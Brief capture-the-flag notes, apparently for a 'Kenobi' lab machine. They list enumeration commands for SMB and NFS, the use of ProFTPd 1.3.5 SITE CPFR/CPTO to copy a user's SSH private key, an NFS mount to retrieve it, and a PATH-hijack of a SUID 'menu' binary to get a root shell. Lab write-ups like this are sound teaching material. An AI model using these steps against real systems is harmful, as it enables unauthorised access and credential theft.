+ Ran initial and all vuln nmap scan
+ Samba/SMB is running
+ SMB shares enumerated using:
	`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.219.170`
+ Found three shares: IPC$, anonymous, print$
+ Inspected shares using smbclient:
	`smbclient //10.10.219.170/anonymous`
+ anonymous contain log.txt. Recursively downloaded using:
	`smbget -R smb://10.10.219.170/anonymous`
+ According to initial nmap scan rpc service is running on port 111 as a network file system. Enumerated using:
	`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.219.170`
			OR	
	`showmount -e 10.10.219.170`
+ ProFTPd Server 1.3.5 running on port 21
+ Found three exploits for proftpd using searchsploit
+ Connected to Proftp using nc and copied SSH private key to /var/tmp using SITE CPFR and SITE CPTO
+ Mounted var directory using:
	`sudo mkdir /mnt/kenobiNFS`
	`sudo mount 10.10.219.170:/var /mnt/kenobiNFS`
+ Copied id_rsa to current working dir and used it to ssh into kenobi
+ Looked for SUID binaries using:
	`find / -perm -u=s -type f 2>/dev/null`
+ /usr/bin/menu is suspicious
+ menu runs three cmds and using strings, we can see that it does not use full path
+ Manipulated the PATH variable to privesc as follows:
	`echo /bin/sh > curl`
	`chmod 777 curl`
	`export PATH=/home/kenobi:$PATH`
	`/usr/bin/menu` -> 1
+ Unmount using `sudo umount /mnt/kenobiNFS`
